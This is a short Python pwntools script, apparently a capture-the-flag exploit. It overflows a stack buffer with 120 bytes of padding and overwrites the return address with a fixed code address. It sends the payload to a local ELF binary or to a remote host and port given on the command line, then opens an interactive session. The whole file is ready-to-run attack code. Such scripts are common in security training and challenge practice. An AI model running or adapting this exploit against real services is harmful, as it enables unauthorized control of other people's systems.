import argparse
from pwn import *
import struct;

offset = b"A"*120
rip = b"\xc9\x11@\x00\x00\x00\x00\x00\x00"

payload = b"".join([offset,rip]) 

parser = argparse.ArgumentParser()
parser.add_argument(
        '--host',
        type=str,
        help='The host name or IP adress to connect to'
        )
parser.add_argument(
        '--port',
        type=int,
        help='The port for the service to connect to'
        )
parser.add_argument(
        '--file',
        type=str,
        help='Elf file to exploit'
        )

args = parser.parse_args()

if args.host and args.port:
        p = remote(args.host, args.port)

elif args.file and not(args.host) and not(args.port):
        elf = ELF(args.file)
        libc = elf.libc
        p=process(elf.path)

else:
        print("No arguments supplied")
        exit()


p.recvuntil('?')
p.sendline(payload)
p.interactive()
